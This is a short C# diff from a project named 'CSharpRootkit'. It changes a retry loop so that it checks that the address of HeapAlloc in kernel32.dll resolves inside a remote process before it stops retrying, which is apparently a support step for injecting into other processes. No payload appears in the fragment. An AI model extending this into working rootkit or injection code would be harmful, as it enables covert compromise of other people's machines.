@@ -263,15 +263,22 @@ namespace CSharpRootkit
                 count++;
                 try
                 {
+                    ulong result = 0;
                     if (is64bit)
                     {
-                        Utils64.GetRemoteProcAddress64Bit(ProcHandle, Utils64.GetRemoteModuleHandle64Bit(ProcHandle, "kernel32.dll"), "HeapAlloc");//just a random function to to test that Its really loaded
+                        result=Utils64.GetRemoteProcAddress64Bit(ProcHandle, Utils64.GetRemoteModuleHandle64Bit(ProcHandle, "kernel32.dll"), "HeapAlloc");//just a random function to to test that Its really loaded
 
                     }
                     else
                     {
-                        Utils32.GetRemoteProcAddress32Bit(ProcHandle, Utils32.GetRemoteModuleHandle32Bit(ProcHandle, "kernel32.dll"), "HeapAlloc");//just a random function to to test that Its really loaded
+                        result=Utils32.GetRemoteProcAddress32Bit(ProcHandle, Utils32.GetRemoteModuleHandle32Bit(ProcHandle, "kernel32.dll"), "HeapAlloc");//just a random function to to test that Its really loaded
                     }
+
+                    if (result == 0) 
+                    {
+                        continue;
+                    }
+
                     break;
                 }
                 catch
